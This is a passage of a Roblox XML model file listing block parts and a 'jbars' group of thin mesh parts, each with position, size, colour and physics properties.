							<X>0</X>
							<Y>0</Y>
							<Z>0</Z>
						</Vector3>
						<float name="TopParamA">-0.5</float>
						<float name="TopParamB">0.5</float>
						<token name="TopSurface">3</token>
						<token name="TopSurfaceInput">0</token>
						<float name="Transparency">0</float>
						<Vector3 name="Velocity">
							<X>0</X>
							<Y>0</Y>
							<Z>0</Z>
						</Vector3>
						<bool name="archivable">true</bool>
						<token name="shape">1</token>
						<Vector3 name="size">
							<X>23</X>
							<Y>3.60000014</Y>
							<Z>1</Z>
						</Vector3>
					</Properties>
				</Item>
				<Item class="Part" referent="RBX44">
					<Properties>
						<bool name="Anchored">true</bool>
						<float name="BackParamA">-0.5</float>
						<float name="BackParamB">0.5</float>
						<token name="BackSurface">0</token>
						<token name="BackSurfaceInput">0</token>
						<float name="BottomParamA">-0.5</float>
						<float name="BottomParamB">0.5</float>
						<token name="BottomSurface">4</token>
						<token name="BottomSurfaceInput">0</token>
						<int name="BrickColor">5</int>
						<CoordinateFrame name="CFrame">
							<X>10.5</X>
							<Y>2</Y>
							<Z>-24.5</Z>
							<R00>0</R00>
							<R01>0</R01>
							<R02>-1</R02>
							<R10>0</R10>
							<R11>1</R11>
							<R12>-0</R12>
							<R20>1</R20>
							<R21>0</R21>
							<R22>-0</R22>
						</CoordinateFrame>
						<bool name="CanCollide">true</bool>
						<bool name="DraggingV1">false</bool>
						<float name="Elasticity">0.5</float>
						<token name="FormFactor">1</token>
						<float name="Friction">0.300000012</float>
						<float name="FrontParamA">-0.5</float>
						<float name="FrontParamB">0.5</float>
						<token name="FrontSurface">0</token>
						<token name="FrontSurfaceInput">0</token>
						<float name="LeftParamA">-0.5</float>
						<float name="LeftParamB">0.5</float>
						<token name="LeftSurface">0</token>
						<token name="LeftSurfaceInput">0</token>
						<bool name="Locked">false</bool>
						<token name="Material">256</token>
						<string name="Name">Smooth Block Model</string>
						<float name="Reflectance">0</float>
						<float name="RightParamA">-0.5</float>
						<float name="RightParamB">0.5</float>
						<token name="RightSurface">0</token>
						<token name="RightSurfaceInput">0</token>
						<Vector3 name="RotVelocity">
							<X>0</X>
							<Y>0</Y>
							<Z>0</Z>
						</Vector3>
						<float name="TopParamA">-0.5</float>
						<float name="TopParamB">0.5</float>
						<token name="TopSurface">3</token>
						<token name="TopSurfaceInput">0</token>
						<float name="Transparency">0</float>
						<Vector3 name="Velocity">
							<X>0</X>
							<Y>0</Y>
							<Z>0</Z>
						</Vector3>
						<bool name="archivable">true</bool>
						<token name="shape">1</token>
						<Vector3 name="size">
							<X>23</X>
							<Y>1.20000005</Y>
							<Z>1</Z>
						</Vector3>
					</Properties>
				</Item>
				<Item class="Part" referent="RBX45">
					<Properties>
						<bool name="Anchored">true</bool>
						<float name="BackParamA">-0.5</float>
						<float name="BackParamB">0.5</float>
						<token name="BackSurface">0</token>
						<token name="BackSurfaceInput">0</token>
						<float name="BottomParamA">-0.5</float>
						<float name="BottomParamB">0.5</float>
						<token name="BottomSurface">4</token>
						<token name="BottomSurfaceInput">0</token>
						<int name="BrickColor">5</int>
						<CoordinateFrame name="CFrame">
							<X>11.5</X>
							<Y>9.19999981</Y>
							<Z>-12.5</Z>
							<R00>0</R00>
							<R01>0</R01>
							<R02>-1</R02>
							<R10>0</R10>
							<R11>1</R11>
							<R12>-0</R12>
							<R20>1</R20>
							<R21>0</R21>
							<R22>-0</R22>
						</CoordinateFrame>
						<bool name="CanCollide">true</bool>
						<bool name="DraggingV1">false</bool>
						<float name="Elasticity">0.5</float>
						<token name="FormFactor">1</token>
						<float name="Friction">0.300000012</float>
						<float name="FrontParamA">-0.5</float>
						<float name="FrontParamB">0.5</float>
						<token name="FrontSurface">0</token>
						<token name="FrontSurfaceInput">0</token>
						<float name="LeftParamA">-0.5</float>
						<float name="LeftParamB">0.5</float>
						<token name="LeftSurface">0</token>
						<token name="LeftSurfaceInput">0</token>
						<bool name="Locked">false</bool>
						<token name="Material">256</token>
						<string name="Name">Smooth Block Model</string>
						<float name="Reflectance">0</float>
						<float name="RightParamA">-0.5</float>
						<float name="RightParamB">0.5</float>
						<token name="RightSurface">0</token>
						<token name="RightSurfaceInput">0</token>
						<Vector3 name="RotVelocity">
							<X>0</X>
							<Y>0</Y>
							<Z>0</Z>
						</Vector3>
						<float name="TopParamA">-0.5</float>
						<float name="TopParamB">0.5</float>
						<token name="TopSurface">3</token>
						<token name="TopSurfaceInput">0</token>
						<float name="Transparency">0</float>
						<Vector3 name="Velocity">
							<X>0</X>
							<Y>0</Y>
							<Z>0</Z>
						</Vector3>
						<bool name="archivable">true</bool>
						<token name="shape">1</token>
						<Vector3 name="size">
							<X>1</X>
							<Y>15.6000004</Y>
							<Z>3</Z>
						</Vector3>
					</Properties>
				</Item>
				<Item class="Part" referent="RBX46">
					<Properties>
						<bool name="Anchored">true</bool>
						<float name="BackParamA">-0.5</float>
						<float name="BackParamB">0.5</float>
						<token name="BackSurface">0</token>
						<token name="BackSurfaceInput">0</token>
						<float name="BottomParamA">-0.5</float>
						<float name="BottomParamB">0.5</float>
						<token name="BottomSurface">4</token>
						<token name="BottomSurfaceInput">0</token>
						<int name="BrickColor">5</int>
						<CoordinateFrame name="CFrame">
							<X>19.5</X>
							<Y>9.19999981</Y>
							<Z>-36.5</Z>
							<R00>0</R00>
							<R01>0</R01>
							<R02>-1</R02>
							<R10>0</R10>
							<R11>1</R11>
							<R12>-0</R12>
							<R20>1</R20>
							<R21>0</R21>
							<R22>-0</R22>
						</CoordinateFrame>
						<bool name="CanCollide">true</bool>
						<bool name="DraggingV1">false</bool>
						<float name="Elasticity">0.5</float>
						<token name="FormFactor">1</token>
						<float name="Friction">0.300000012</float>
						<float name="FrontParamA">-0.5</float>
						<float name="FrontParamB">0.5</float>
						<token name="FrontSurface">0</token>
						<token name="FrontSurfaceInput">0</token>
						<float name="LeftParamA">-0.5</float>
						<float name="LeftParamB">0.5</float>
						<token name="LeftSurface">0</token>
						<token name="LeftSurfaceInput">0</token>
						<bool name="Locked">false</bool>
						<token name="Material">256</token>
						<string name="Name">Smooth Block Model</string>
						<float name="Reflectance">0</float>
						<float name="RightParamA">-0.5</float>
						<float name="RightParamB">0.5</float>
						<token name="RightSurface">0</token>
						<token name="RightSurfaceInput">0</token>
						<Vector3 name="RotVelocity">
							<X>0</X>
							<Y>0</Y>
							<Z>0</Z>
						</Vector3>
						<float name="TopParamA">-0.5</float>
						<float name="TopParamB">0.5</float>
						<token name="TopSurface">3</token>
						<token name="TopSurfaceInput">0</token>
						<float name="Transparency">0</float>
						<Vector3 name="Velocity">
							<X>0</X>
							<Y>0</Y>
							<Z>0</Z>
						</Vector3>
						<bool name="archivable">true</bool>
						<token name="shape">1</token>
						<Vector3 name="size">
							<X>1</X>
							<Y>15.6000004</Y>
							<Z>19</Z>
						</Vector3>
					</Properties>
				</Item>
				<Item class="Part" referent="RBX47">
					<Properties>
						<bool name="Anchored">true</bool>
						<float name="BackParamA">-0.5</float>
						<float name="BackParamB">0.5</float>
						<token name="BackSurface">0</token>
						<token name="BackSurfaceInput">0</token>
						<float name="BottomParamA">-0.5</float>
						<float name="BottomParamB">0.5</float>
						<token name="BottomSurface">4</token>
						<token name="BottomSurfaceInput">0</token>
						<int name="BrickColor">5</int>
						<CoordinateFrame name="CFrame">
							<X>12.5</X>
							<Y>2</Y>
							<Z>-24.5</Z>
							<R00>0</R00>
							<R01>0</R01>
							<R02>-1</R02>
							<R10>0</R10>
							<R11>1</R11>
							<R12>-0</R12>
							<R20>1</R20>
							<R21>0</R21>
							<R22>-0</R22>
						</CoordinateFrame>
						<bool name="CanCollide">true</bool>
						<bool name="DraggingV1">false</bool>
						<float name="Elasticity">0.5</float>
						<token name="FormFactor">1</token>
						<float name="Friction">0.300000012</float>
						<float name="FrontParamA">-0.5</float>
						<float name="FrontParamB">0.5</float>
						<token name="FrontSurface">0</token>
						<token name="FrontSurfaceInput">0</token>
						<float name="LeftParamA">-0.5</float>
						<float name="LeftParamB">0.5</float>
						<token name="LeftSurface">0</token>
						<token name="LeftSurfaceInput">0</token>
						<bool name="Locked">false</bool>
						<token name="Material">256</token>
						<string name="Name">Smooth Block Model</string>
						<float name="Reflectance">0</float>
						<float name="RightParamA">-0.5</float>
						<float name="RightParamB">0.5</float>
						<token name="RightSurface">0</token>
						<token name="RightSurfaceInput">0</token>
						<Vector3 name="RotVelocity">
							<X>0</X>
							<Y>0</Y>
							<Z>0</Z>
						</Vector3>
						<float name="TopParamA">-0.5</float>
						<float name="TopParamB">0.5</float>
						<token name="TopSurface">3</token>
						<token name="TopSurfaceInput">0</token>
						<float name="Transparency">0</float>
						<Vector3 name="Velocity">
							<X>0</X>
							<Y>0</Y>
							<Z>0</Z>
						</Vector3>
						<bool name="archivable">true</bool>
						<token name="shape">1</token>
						<Vector3 name="size">
							<X>23</X>
							<Y>1.20000005</Y>
							<Z>1</Z>
						</Vector3>
					</Properties>
				</Item>
				<Item class="Model" referent="RBX48">
					<Properties>
						<CoordinateFrame name="ModelInPrimary">
							<X>0</X>
							<Y>0</Y>
							<Z>0</Z>
							<R00>1</R00>
							<R01>0</R01>
							<R02>0</R02>
							<R10>0</R10>
							<R11>1</R11>
							<R12>0</R12>
							<R20>0</R20>
							<R21>0</R21>
							<R22>1</R22>
						</CoordinateFrame>
						<string name="Name">jbars</string>
						<Ref name="PrimaryPart">null</Ref>
						<bool name="archivable">true</bool>
					</Properties>
					<Item class="Part" referent="RBX49">
						<Properties>
							<bool name="Anchored">false</bool>
							<float name="BackParamA">-0.5</float>
							<float name="BackParamB">0.5</float>
							<token name="BackSurface">0</token>
							<token name="BackSurfaceInput">0</token>
							<float name="BottomParamA">-0.5</float>
							<float name="BottomParamB">0.5</float>
							<token name="BottomSurface">2</token>
							<token name="BottomSurfaceInput">0</token>
							<int name="BrickColor">194</int>
							<CoordinateFrame name="CFrame">
								<X>12.5</X>
								<Y>8</Y>
								<Z>-15.5</Z>
								<R00>-0</R00>
								<R01>0</R01>
								<R02>1</R02>
								<R10>-0</R10>
								<R11>1</R11>
								<R12>0</R12>
								<R20>-1</R20>
								<R21>0</R21>
								<R22>0</R22>
							</CoordinateFrame>
							<bool name="CanCollide">true</bool>
							<bool name="DraggingV1">false</bool>
							<float name="Elasticity">0.5</float>
							<token name="FormFactor">1</token>
							<float name="Friction">0.300000012</float>
							<float name="FrontParamA">-0.5</float>
							<float name="FrontParamB">0.5</float>
							<token name="FrontSurface">0</token>
							<token name="FrontSurfaceInput">0</token>
							<float name="LeftParamA">-0.5</float>
							<float name="LeftParamB">0.5</float>
							<token name="LeftSurface">0</token>
							<token name="LeftSurfaceInput">0</token>
							<bool name="Locked">false</bool>
							<token name="Material">256</token>
							<string name="Name">Snooth Block Model</string>
							<float name="Reflectance">0</float>
							<float name="RightParamA">-0.5</float>
							<float name="RightParamB">0.5</float>
							<token name="RightSurface">0</token>
							<token name="RightSurfaceInput">0</token>
							<Vector3 name="RotVelocity">
								<X>0</X>
								<Y>0</Y>
								<Z>0</Z>
							</Vector3>
							<float name="TopParamA">-0.5</float>
							<float name="TopParamB">0.5</float>
							<token name="TopSurface">2</token>
							<token name="TopSurfaceInput">0</token>
							<float name="Transparency">0</float>
							<Vector3 name="Velocity">
								<X>0</X>
								<Y>0</Y>
								<Z>0</Z>
							</Vector3>
							<bool name="archivable">true</bool>
							<token name="shape">1</token>
							<Vector3 name="size">
								<X>1</X>
								<Y>10.8000002</Y>
								<Z>1</Z>
							</Vector3>
						</Properties>
						<Item class="SpecialMesh" referent="RBX50">
							<Properties>
								<token name="LODX">2</token>
								<token name="LODY">2</token>
								<Content name="MeshId"><url>http://www.roblox.com/asset/?id=12221344</url></Content>
								<token name="MeshType">6</token>
								<string name="Name">Mesh</string>
								<Vector3 name="Offset">
									<X>0</X>
									<Y>0</Y>
									<Z>0</Z>
								</Vector3>
								<Vector3 name="Scale">
									<X>0.5</X>
									<Y>1</Y>
									<Z>0.5</Z>
								</Vector3>
								<Content name="TextureId"><null></null></Content>
								<Vector3 name="VertexColor">
									<X>1</X>
									<Y>1</Y>
									<Z>1</Z>
								</Vector3>
								<bool name="archivable">true</bool>
							</Properties>
						</Item>
					</Item>
					<Item class="Part" referent="RBX51">
						<Properties>
							<bool name="Anchored">false</bool>
							<float name="BackParamA">-0.5</float>
							<float name="BackParamB">0.5</float>
							<token name="BackSurface">0</token>
							<token name="BackSurfaceInput">0</token>
							<float name="BottomParamA">-0.5</float>
							<float name="BottomParamB">0.5</float>
							<token name="BottomSurface">2</token>
							<token name="BottomSurfaceInput">0</token>
							<int name="BrickColor">194</int>
							<CoordinateFrame name="CFrame">
								<X>12.5</X>
								<Y>8</Y>
								<Z>-14.5</Z>
								<R00>-0</R00>
								<R01>0</R01>
								<R02>1</R02>
								<R10>-0</R10>
								<R11>1</R11>
								<R12>0</R12>
								<R20>-1</R20>
								<R21>0</R21>
								<R22>0</R22>
							</CoordinateFrame>
							<bool name="CanCollide">true</bool>
							<bool name="DraggingV1">false</bool>
							<float name="Elasticity">0.5</float>
							<token name="FormFactor">1</token>
							<float name="Friction">0.300000012</float>
							<float name="FrontParamA">-0.5</float>
							<float name="FrontParamB">0.5</float>
							<token name="FrontSurface">0</token>
							<token name="FrontSurfaceInput">0</token>
							<float name="LeftParamA">-0.5</float>
							<float name="LeftParamB">0.5</float>
							<token name="LeftSurface">0</token>
							<token name="LeftSurfaceInput">0</token>
							<bool name="Locked">false</bool>
							<token name="Material">256</token>
							<string name="Name">Snooth Block Model</string>
							<float name="Reflectance">0</float>
							<float name="RightParamA">-0.5</float>
							<float name="RightParamB">0.5</float>
							<token name="RightSurface">0</token>
							<token name="RightSurfaceInput">0</token>
							<Vector3 name="RotVelocity">
								<X>0</X>
								<Y>0</Y>
								<Z>0</Z>
							</Vector3>
							<float name="TopParamA">-0.5</float>
							<float name="TopParamB">0.5</float>
							<token name="TopSurface">2</token>
							<token name="TopSurfaceInput">0</token>
							<float name="Transparency">0</float>
							<Vector3 name="Velocity">
								<X>0</X>
								<Y>0</Y>
								<Z>0</Z>
							</Vector3>
							<bool name="archivable">true</bool>
							<token name="shape">1</token>
							<Vector3 name="size">
								<X>1</X>
								<Y>10.8000002</Y>
								<Z>1</Z>
							</Vector3>
						</Properties>
						<Item class="SpecialMesh" referent="RBX52">
							<Properties>
								<token name="LODX">2</token>
								<token name="LODY">2</token>
								<Content name="MeshId"><url>http://www.roblox.com/asset/?id=12221344</url></Content>
								<token name="MeshType">6</token>
								<string name="Name">Mesh</string>
								<Vector3 name="Offset">
									<X>0</X>
									<Y>0</Y>
									<Z>0</Z>
								</Vector3>
								<Vector3 name="Scale">
									<X>0.5</X>
									<Y>1</Y>
									<Z>0.5</Z>
								</Vector3>
								<Content name="TextureId"><null></null></Content>
								<Vector3 name="VertexColor">
									<X>1</X>
									<Y>1</Y>
									<Z>1</Z>
								</Vector3>
								<bool name="archivable">true</bool>
							</Properties>
						</Item>
					</Item>
					<Item class="Part" referent="RBX53">
						<Properties>
							<bool name="Anchored">false</bool>
							<float name="BackParamA">-0.5</float>
							<float name="BackParamB">0.5</float>
							<token name="BackSurface">0</token>
							<token name="BackSurfaceInput">0</token>
							<float name="BottomParamA">-0.5</float>
							<float name="BottomParamB">0.5</float>
							<token name="BottomSurface">2</token>
							<token name="BottomSurfaceInput">0</token>
							<int name="BrickColor">194</int>
							<CoordinateFrame name="CFrame">
								<X>12.5</X>
								<Y>8</Y>
								<Z>-13.5</Z>
								<R00>-0</R00>
								<R01>0</R01>
								<R02>1</R02>
								<R10>-0</R10>
								<R11>1</R11>
								<R12>0</R12>
								<R20>-1</R20>
								<R21>0</R21>
								<R22>0</R22>
							</CoordinateFrame>
							<bool name="CanCollide">true</bool>
							<bool name="DraggingV1">false</bool>
							<float name="Elasticity">0.5</float>
							<token name="FormFactor">1</token>
							<float name="Friction">0.300000012</float>
							<float name="FrontParamA">-0.5</float>
							<float name="FrontParamB">0.5</float>
							<token name="FrontSurface">0</token>
							<token name="FrontSurfaceInput">0</token>
							<float name="LeftParamA">-0.5</float>
							<float name="LeftParamB">0.5</float>
							<token name="LeftSurface">0</token>
							<token name="LeftSurfaceInput">0</token>
							<bool name="Locked">false</bool>
							<token name="Material">256</token>
							<string name="Name">Snooth Block Model</string>
							<float name="Reflectance">0</float>
							<float name="RightParamA">-0.5</float>
							<float name="RightParamB">0.5</float>
							<token name="RightSurface">0</token>
							<token name="RightSurfaceInput">0</token>
							<Vector3 name="RotVelocity">
								<X>0</X>
								<Y>0</Y>
								<Z>0</Z>
							</Vector3>
							<float name="TopParamA">-0.5</float>
							<float name="TopParamB">0.5</float>
							<token name="TopSurface">2</token>
							<token name="TopSurfaceInput">0</token>
							<float name="Transparency">0</float>
							<Vector3 name="Velocity">
								<X>0</X>
								<Y>0</Y>
								<Z>0</Z>
							</Vector3>
							<bool name="archivable">true</bool>
							<token name="shape">1</token>
							<Vector3 name="size">
								<X>1</X>
								<Y>10.8000002</Y>
								<Z>1</Z>
							</Vector3>
						</Properties>
						<Item class="SpecialMesh" referent="RBX54">
							<Properties>
								<token name="LODX">2</token>
								<token name="LODY">2</token>
								<Content name="MeshId"><url>http://www.roblox.com/asset/?id=12221344</url></Content>
								<token name="MeshType">6</token>
								<string name="Name">Mesh</string>
								<Vector3 name="Offset">
									<X>0</X>
									<Y>0</Y>
									<Z>0</Z>
								</Vector3>
								<Vector3 name="Scale">
									<X>0.5</X>
									<Y>1</Y>
									<Z>0.5</Z>
								</Vector3>
								<Content name="TextureId"><null></null></Content>
								<Vector3 name="VertexColor">
									<X>1</X>
									<Y>1</Y>
									<Z>1</Z>
								</Vector3>
								<bool name="archivable">true</bool>
							</Properties>
						</Item>
					</Item>
					<Item class="Part" referent="RBX55">
						<Properties>
							<bool name="Anchored">false</bool>
							<float name="BackParamA">-0.5</float>
							<float name="BackParamB">0.5</float>
							<token name="BackSurface">0</token>
							<token name="BackSurfaceInput">0</token>
							<float name="BottomParamA">-0.5</float>
							<float name="BottomParamB">0.5</float>
							<token name="BottomSurface">2</token>
							<token name="BottomSurfaceInput">0</token>
							<int name="BrickColor">194</int>
							<CoordinateFrame name="CFrame">
								<X>12.5</X>
								<Y>8</Y>
								<Z>-17.5</Z>
								<R00>-0</R00>
								<R01>0</R01>
								<R02>1</R02>
								<R10>-0</R10>
								<R11>1</R11>
								<R12>0</R12>
								<R20>-1</R20>
								<R21>0</R21>
								<R22>0</R22>
							</CoordinateFrame>
							<bool name="CanCollide">true</bool>
							<bool name="DraggingV1">false</bool>
							<float name="Elasticity">0.5</float>
							<token name="FormFactor">1</token>
							<float name="Friction">0.300000012</float>
							<float name="FrontParamA">-0.5</float>
							<float name="FrontParamB">0.5</float>
							<token name="FrontSurface">0</token>
							<token name="FrontSurfaceInput">0</token>
							<float name="LeftParamA">-0.5</float>
							<float name="LeftParamB">0.5</float>
							<token name="LeftSurface">0</token>
							<token name="LeftSurfaceInput">0</token>
							<bool name="Locked">false</bool>
							<token name="Material">256</token>
							<string name="Name">Snooth Block Model</string>
							<float name="Reflectance">0</float>
							<float name="RightParamA">-0.5</float>
							<float name="RightParamB">0.5</float>
							<token name="RightSurface">0</token>
							<token name="RightSurfaceInput">0</token>
							<Vector3 name="RotVelocity">
								<X>0</X>
								<Y>0</Y>
								<Z>0</Z>
							</Vector3>
							<float name="TopParamA">-0.5</float>
							<float name="TopParamB">0.5</float>
							<token name="TopSurface">2</token>
							<token name="TopSurfaceInput">0</token>
							<float name="Transparency">0</float>
							<Vector3 name="Velocity">
								<X>0</X>
								<Y>0</Y>
								<Z>0</Z>
							</Vector3>
							<bool name="archivable">true</bool>
							<token name="shape">1</token>
							<Vector3 name="size">
								<X>1</X>
								<Y>10.8000002</Y>
								<Z>1</Z>
							</Vector3>
						</Properties>
						<Item class="SpecialMesh" referent="RBX56">
							<Properties>
								<token name="LODX">2</token>
								<token name="LODY">2</token>
								<Content name="MeshId"><url>http://www.roblox.com/asset/?id=12221344</url></Content>
								<token name="MeshType">6</token>
								<string name="Name">Mesh</string>
								<Vector3 name="Offset">
									<X>0</X>
									<Y>0</Y>
									<Z>0</Z>
								</Vector3>
								<Vector3 name="Scale">
									<X>0.5</X>
									<Y>1</Y>
									<Z>0.5</Z>
								</Vector3>
								<Content name="TextureId"><null></null></Content>
								<Vector3 name="VertexColor">
									<X>1</X>
									<Y>1</Y>
									<Z>1</Z>
								</Vector3>
								<bool name="archivable">true</bool>
							</Properties>
						</Item>
					</Item>
					<Item class="Part" referent="RBX57">
						<Properties>
							<bool name="Anchored">false</bool>
							<float name="BackParamA">-0.5</float>
							<float name="BackParamB">0.5</float>
							<token name="BackSurface">0</token>
							<token name="BackSurfaceInput">0</token>
							<float name="BottomParamA">-0.5</float>
							<float name="BottomParamB">0.5</float>
							<token name="BottomSurface">2</token>
							<token name="BottomSurfaceInput">0</token>
							<int name="BrickColor">194</int>
							<CoordinateFrame name="CFrame">
								<X>12.5</X>
								<Y>8</Y>
								<Z>-18.5</Z>
								<R00>-0</R00>
								<R01>0</R01>
								<R02>1</R02>
								<R10>-0</R10>
								<R11>1</R11>
								<R12>0</R12>
								<R20>-1</R20>
								<R21>0</R21>
								<R22>0</R22>
							</CoordinateFrame>
							<bool name="CanCollide">true</bool>
							<bool name="DraggingV1">false</bool>
							<float name="Elasticity">0.5</float>
							<token name="FormFactor">1</token>
							<float name="Friction">0.300000012</float>
							<float name="FrontParamA">-0.5</float>
							<float name="FrontParamB">0.5</float>
							<token name="FrontSurface">0</token>
							<token name="FrontSurfaceInput">0</token>
							<float name="LeftParamA">-0.5</float>
							<float name="LeftParamB">0.5</float>
							<token name="LeftSurface">0</token>
							<token name="LeftSurfaceInput">0</token>
							<bool name="Locked">false</bool>
							<token name="Material">256</token>
							<string name="Name">Snooth Block Model</string>
							<float name="Reflectance">0</float>
							<float name="RightParamA">-0.5</float>
							<float name="RightParamB">0.5</float>
							<token name="RightSurface">0</token>
							<token name="RightSurfaceInput">0</token>
							<Vector3 name="RotVelocity">
								<X>0</X>
								<Y>0</Y>
								<Z>0</Z>
							</Vector3>
							<float name="TopParamA">-0.5</float>
							<float name="TopParamB">0.5</float>
							<token name="TopSurface">2</token>
							<token name="TopSurfaceInput">0</token>
							<float name="Transparency">0</float>
							<Vector3 name="Velocity">
								<X>0</X>
								<Y>0</Y>
								<Z>0</Z>
							</Vector3>
							<bool name="archivable">true</bool>
							<token name="shape">1</token>
							<Vector3 name="size">
								<X>1</X>
								<Y>10.8000002</Y>
								<Z>1</Z>
							</Vector3>
						</Properties>
						<Item class="SpecialMesh" referent="RBX58">
							<Properties>
								<token name="LODX">2</token>
								<token name="LODY">2</token>
								<Content name="MeshId"><url>http://www.roblox.com/asset/?id=12221344</url></Content>
								<token name="MeshType">6</token>
								<string name="Name">Mesh</string>
								<Vector3 name="Offset">
									<X>0</X>
									<Y>0</Y>
									<Z>0</Z>
								</Vector3>
								<Vector3 name="Scale">
									<X>0.5</X>
									<Y>1</Y>
									<Z>0.5</Z>
								</Vector3>
								<Content name="TextureId"><null></null></Content>
								<Vector3 name="VertexColor">
									<X>1</X>
									<Y>1</Y>
									<Z>1</Z>
								</Vector3>
								<bool name="archivable">true</bool>
							</Properties>
						</Item>
					</Item>
					<Item class="Part" referent="RBX59">
						<Properties>
							<bool name="Anchored">false</bool>
							<float name="BackParamA">-0.5</float>
							<float name="BackParamB">0.5</float>
							<token name="BackSurface">0</token>
							<token name="BackSurfaceInput">0</token>
							<float name="BottomParamA">-0.5</float>
							<float name="BottomParamB">0.5</float>
							<token name="BottomSurface">2</token>
							<token name="BottomSurfaceInput">0</token>
							<int name="BrickColor">194</int>
							<CoordinateFrame name="CFrame">
								<X>12.5</X>
								<Y>8</Y>
								<Z>-16.5</Z>
								<R00>-0</R00>
								<R01>0</R01>
								<R02>1</R02>
								<R10>-0</R10>
								<R11>1</R11>
								<R12>0</R12>
								<R20>-1</R20>
								<R21>0</R21>
								<R22>0</R22>
							</CoordinateFrame>
							<bool name="CanCollide">true</bool>
							<bool name="DraggingV1">false</bool>
							<float name="Elasticity">0.5</float>
							<token name="FormFactor">1</token>
							<float name="Friction">0.300000012</float>
							<float name="FrontParamA">-0.5</float>
							<float name="FrontParamB">0.5</float>
							<token name="FrontSurface">0</token>
							<token name="FrontSurfaceInput">0</token>
							<float name="LeftParamA">-0.5</float>
							<float name="LeftParamB">0.5</float>
							<token name="LeftSurface">0</token>
							<token name="LeftSurfaceInput">0</token>
							<bool name="Locked">false</bool>
							<token name="Material">256</token>
							<string name="Name">Snooth Block Model</string>
							<float name="Reflectance">0</float>
							<float name="RightParamA">-0.5</float>
							<float name="RightParamB">0.5</float>
							<token name="RightSurface">0</token>
							<token name="RightSurfaceInput">0</token>
							<Vector3 name="RotVelocity">
								<X>0</X>
								<Y>0</Y>
								<Z>0</Z>
							</Vector3>
							<float name="TopParamA">-0.5</float>
							<float name="TopParamB">0.5</float>
							<token name="TopSurface">2</token>
							<token name="TopSurfaceInput">0</token>
							<float name="Transparency">0</float>
							<Vector3 name="Velocity">
								<X>0</X>
								<Y>0</Y>
								<Z>0</Z>
							</Vector3>
							<bool name="archivable">true</bool>
							<token name="shape">1</token>
							<Vector3 name="size">
								<X>1</X>
								<Y>10.8000002</Y>
								<Z>1</Z>
							</Vector3>
						</Properties>
						<Item class="SpecialMesh" referent="RBX60">
							<Properties>
								<token name="LODX">2</token>
								<token name="LODY">2</token>
								<Content name="MeshId"><url>http://www.roblox.com/asset/?id=12221344</url></Content>
								<token name="MeshType">6</token>
								<string name="Name">Mesh</string>
								<Vector3 name="Offset">
									<X>0</X>
									<Y>0</Y>
									<Z>0</Z>
								</Vector3>
								<Vector3 name="Scale">
									<X>0.5</X>
									<Y>1</Y>
									<Z>0.5</Z>
								</Vector3>
								<Content name="TextureId"><null></null></Content>
								<Vector3 name="VertexColor">
									<X>1</X>
									<Y>1</Y>
									<Z>1</Z>
								</Vector3>
								<bool name="archivable">true</bool>
							</Properties>
						</Item>
					</Item>
					<Item class="Part" referent="RBX61">
						<Properties>
							<bool name="Anchored">false</bool>
							<float name="BackParamA">-0.5</float>
							<float name="BackParamB">0.5</float>
							<token name="BackSurface">0</token>
							<token name="BackSurfaceInput">0</token>
							<float name="BottomParamA">-0.5</float>
							<float name="BottomParamB">0.5</float>
							<token name="BottomSurface">2</token>
							<token name="BottomSurfaceInput">0</token>
							<int name="BrickColor">194</int>
							<CoordinateFrame name="CFrame">
								<X>12.5</X>
								<Y>8</Y>
								<Z>-19.5</Z>
								<R00>-0</R00>
								<R01>0</R01>
								<R02>1</R02>
								<R10>-0</R10>
								<R11>1</R11>
								<R12>0</R12>
								<R20>-1</R20>
								<R21>0</R21>
								<R22>0</R22>
							</CoordinateFrame>
							<bool name="CanCollide">true</bool>
							<bool name="DraggingV1">false</bool>
							<float name="Elasticity">0.5</float>
							<token name="FormFactor">1</token>
							<float name="Friction">0.300000012</float>
							<float name="FrontParamA">-0.5</float>
							<float name="FrontParamB">0.5</float>
							<token name="FrontSurface">0</token>
							<token name="FrontSurfaceInput">0</token>
							<float name="LeftParamA">-0.5</float>
							<float name="LeftParamB">0.5</float>
							<token name="LeftSurface">0</token>
							<token name="LeftSurfaceInput">0</token>
							<bool name="Locked">false</bool>
							<token name="Material">256</token>
							<string name="Name">Snooth Block Model</string>
							<float name="Reflectance">0</float>
							<float name="RightParamA">-0.5</float>
							<float name="RightParamB">0.5</float>
							<token name="RightSurface">0</token>
							<token name="RightSurfaceInput">0</token>
							<Vector3 name="RotVelocity">
								<X>0</X>
								<Y>0</Y>
								<Z>0</Z>
							</Vector3>
							<float name="TopParamA">-0.5</float>
							<float name="TopParamB">0.5</float>
							<token name="TopSurface">2</token>
							<token name="TopSurfaceInput">0</token>
							<float name="Transparency">0</float>
							<Vector3 name="Velocity">
								<X>0</X>
								<Y>0</Y>
								<Z>0</Z>
							</Vector3>
							<bool name="archivable">true</bool>
							<token name="shape">1</token>
							<Vector3 name="size">
								<X>1</X>
								<Y>10.8000002</Y>
								<Z>1</Z>
							</Vector3>
						</Properties>
						<Item class="SpecialMesh" referent="RBX62">
							<Properties>
								<token name="LODX">2</token>
								<token name="LODY">2</token>
								<Content name="MeshId"><url>http://www.roblox.com/asset/?id=12221344</url></Content>
								<token name="MeshType">6</token>
								<string name="Name">Mesh</string>
								<Vector3 name="Offset">
									<X>0</X>
									<Y>0</Y>
									<Z>0</Z>
								</Vector3>
								<Vector3 name="Scale">
									<X>0.5</X>
									<Y>1</Y>
									<Z>0.5</Z>
								</Vector3>
								<Content name="TextureId"><null></null></Content>
								<Vector3 name="VertexColor">
									<X>1</X>
									<Y>1</Y>
									<Z>1</Z>
								</Vector3>
								<bool name="archivable">true</bool>
							</Properties>
						</Item>
					</Item>
					<Item class="Part" referent="RBX63">
						<Properties>
							<bool name="Anchored">false</bool>
							<float name="BackParamA">-0.5</float>
							<float name="BackParamB">0.5</float>
							<token name="BackSurface">0</token>
							<token name="BackSurfaceInput">0</token>
							<float name="BottomParamA">-0.5</float>
							<float name="BottomParamB">0.5</float>
							<token name="BottomSurface">2</token>
							<token name="BottomSurfaceInput">0</token>
							<int name="BrickColor">194</int>
							<CoordinateFrame name="CFrame">
								<X>12.5</X>
								<Y>8</Y>
								<Z>-21.5</Z>
								<R00>-0</R00>
								<R01>0</R01>
								<R02>1</R02>
								<R10>-0</R10>
								<R11>1</R11>
								<R12>0</R12>
								<R20>-1</R20>
								<R21>0</R21>
								<R22>0</R22>
							</CoordinateFrame>
							<bool name="CanCollide">true</bool>
							<bool name="DraggingV1">false</bool>
							<float name="Elasticity">0.5</float>
							<token name="FormFactor">1</token>
							<float name="Friction">0.300000012</float>
							<float name="FrontParamA">-0.5</float>
